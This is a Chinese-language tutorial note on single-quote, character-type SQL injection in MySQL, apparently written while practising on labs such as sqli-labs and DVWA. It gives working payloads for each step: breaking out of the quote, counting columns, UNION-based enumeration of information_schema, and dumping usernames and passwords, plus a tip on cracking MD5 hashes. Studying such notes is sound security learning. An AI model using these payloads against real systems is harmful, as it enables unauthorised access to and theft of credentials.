# SQL注入笔记（字符型单引号注入）

#### 🔍 1. 确认注入点

- **操作**：在可控参数后添加单引号`'`，如`?id=1'`或输入`1'`

- **判断**：页面报错（如MySQL语法错误），说明存在单引号闭合的字符型注入

- **原理**：后端SQL语句`SELECT * FROM users WHERE id='$id'`中，`$id`被替换为`1'`，导致语句变为`SELECT * FROM users WHERE id='1''`，语法错误触发报错

#### 🔒 2. 闭合与注释（关键！适配场景）

- **GET请求（URL参数）**：使用`--+`（`--`是MySQL注释，`+`是URL编码的空格，避免被截断）

    - 示例：`?id=1' --+` → 后端语句变为`SELECT * FROM users WHERE id='1' --+' LIMIT 0,1`，`--+`后的内容被注释，语句合法

- **输入框/POST请求**：使用`#`（MySQL原生注释，无需URL编码）

    - 示例：`1' #` → 后端语句变为`SELECT * FROM users WHERE id='1' #'`，`#`后的内容被注释

#### 📊 3. 判断字段数

- **操作**：使用`order by N`语句，逐步增大N直到页面报错

    - 示例：`?id=1' order by 3 --+`（正常），`?id=1' order by 4 --+`（报错）→ 共3个字段

    - 示例：`1' order by 2 #`（正常），`1' order by 3 #`（报错）→ 共2个字段

- **原理**：`order by N`按第N个字段排序，若N超过字段总数则报错

#### 🔍 4. 找回显位（联合查询的前提，默认1代表id，前端不显示，一般从2开始显示）

- **操作**：使用`UNION SELECT`语句，让前序查询无结果（如`id=-1'`），从而显示UNION后的结果

    - 示例（3字段）：`?id=-1' union select 1,2,3 --+` → 页面回显`2`和`3`，说明第2、3字段可显

    - 示例（2字段）：`1' union select 1,2 #` → 页面回显`1`和`2`，说明第1、2字段可显

- **原理**：`UNION`要求前后查询字段数一致，前序查询无结果时，UNION后的结果会被显示

#### 📚 5. 获取数据库元信息

- **数据库名**：使用`database()`函数

    - 示例：`?id=-1' union select 1,database(),3 --+` → 回显数据库名（如`security`）

- **数据库版本**：使用`version()`函数

    - 示例：`?id=-1' union select 1,version(),3 --+` → 回显MySQL版本（如`5.7.26`）

#### 📋 6. 获取表名

- **操作**：查询`information_schema.tables`表，过滤当前数据库的表

    - 示例（3字段）：`?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`

    - 示例（2字段）：`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`

- **结果**：回显当前数据库的所有表名（如`emails,referers,uagents,users`）

#### 📝 7. 获取字段名

- **操作**：查询`information_schema.columns`表，过滤目标表的字段

    - 示例（3字段）：`?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+`

    - 示例（2字段）：`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`

- **结果**：回显目标表的所有字段名（如`id,username,password`）

#### 🔑 8. 获取敏感数据（用户名/密码）

- **操作**：直接查询目标表的敏感字段，可拼接字段方便查看

    - 示例（3字段）：`?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+` → 用冒号`:`（`0x3a`是十六进制）拼接用户名和密码

    - 示例（2字段）：`1' union select user,password from users #` → 直接查询用户和密码

- **补充**：若密码是MD5加密（如DVWA中），可使用MD5解密工具（如在线解密、彩虹表）获取明文密码

#### 


